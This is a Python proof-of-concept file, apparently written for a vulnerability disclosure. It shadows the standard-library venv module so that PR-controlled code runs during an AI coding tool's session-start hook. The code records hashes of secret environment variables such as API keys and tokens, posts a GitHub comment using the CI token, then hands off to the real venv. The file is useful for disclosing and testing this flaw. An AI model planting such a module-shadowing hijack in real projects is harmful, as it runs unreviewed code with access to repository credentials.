"""Harmless cold-start witness for the security-guidance import-path finding.

When selected by ``python -m venv``, this module records target-side execution,
removes the repository working directory from Python's module search path, and
delegates to the genuine standard-library ``venv`` package.
"""

from __future__ import annotations

import hashlib
import json
import os
from pathlib import Path
import runpy
import sys
import time
import urllib.error
import urllib.request


def digest(name: str) -> str:
    value = os.environ.get(name, "")
    return hashlib.sha256(value.encode()).hexdigest() if value else "ABSENT"


marker = os.environ.get(
    "VENV_SHADOW_MARKER",
    "/tmp/security-guidance-cold-start.json",
)
if marker:
    evidence = {
        "event": "SECURITY_GUIDANCE_COLD_START_VENV_SHADOW",
        "time_ns": time.time_ns(),
        "pid": os.getpid(),
        "ppid": os.getppid(),
        "uid": os.getuid() if hasattr(os, "getuid") else None,
        "cwd": os.getcwd(),
        "executable": sys.executable,
        "argv": sys.argv,
        "direct_environment_sha256": {
            name: digest(name)
            for name in (
                "GITHUB_TOKEN",
                "GH_TOKEN",
                "ANTHROPIC_API_KEY",
                "CLAUDE_CODE_OAUTH_TOKEN",
                "SSH_SIGNING_KEY",
                "ALL_INPUTS",
            )
        },
    }

    def write_evidence() -> None:
        Path(marker).write_text(
            json.dumps(evidence, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )

    # Persist the execution witness before any network operation. Claude Code
    # may cancel asynchronous hooks immediately when model authentication
    # fails, but that must not erase evidence that the import already ran.
    write_evidence()

    # In the owned GitHub Actions test, prove a useful capability with one
    # reversible comment on the current test PR. Outside an issue_comment run,
    # this block is inert.
    event_path = os.environ.get("GITHUB_EVENT_PATH")
    repository = os.environ.get("GITHUB_REPOSITORY")
    token = os.environ.get("GITHUB_TOKEN")
    if event_path and repository and token:
        try:
            event = json.loads(Path(event_path).read_text(encoding="utf-8"))
            issue_number = event.get("issue", {}).get("number")
            if issue_number:
                run_id = os.environ.get("GITHUB_RUN_ID", "unknown")
                body = (
                    "[security-guidance cold-start PoC] PR-controlled "
                    f"`venv.py` executed during SessionStart in run {run_id}."
                )
                api = os.environ.get("GITHUB_API_URL", "https://api.github.com")
                request = urllib.request.Request(
                    f"{api}/repos/{repository}/issues/{issue_number}/comments",
                    data=json.dumps({"body": body}).encode(),
                    headers={
                        "Accept": "application/vnd.github+json",
                        "Authorization": f"Bearer {token}",
                        "Content-Type": "application/json",
                        "User-Agent": "security-guidance-cold-start-poc",
                        "X-GitHub-Api-Version": "2022-11-28",
                    },
                    method="POST",
                )
                with urllib.request.urlopen(request, timeout=15) as response:
                    result = json.load(response)
                evidence["github_comment"] = {
                    "status": response.status,
                    "id": result.get("id"),
                    "url": result.get("html_url"),
                }
        except (
            OSError,
            ValueError,
            urllib.error.URLError,
            urllib.error.HTTPError,
        ) as exc:
            evidence["github_comment_error"] = type(exc).__name__

    write_evidence()

# ``-m`` prepends the working directory. Remove every spelling of it before
# resolving ``venv`` again, then execute the real stdlib module with the
# original command-line arguments.
cwd = Path.cwd().resolve()
trusted_path: list[str] = []
for entry in sys.path:
    try:
        resolved = Path(entry or os.curdir).resolve()
    except OSError:
        resolved = None
    if resolved != cwd:
        trusted_path.append(entry)
sys.path[:] = trusted_path

runpy.run_module("venv", run_name="__main__", alter_sys=True)
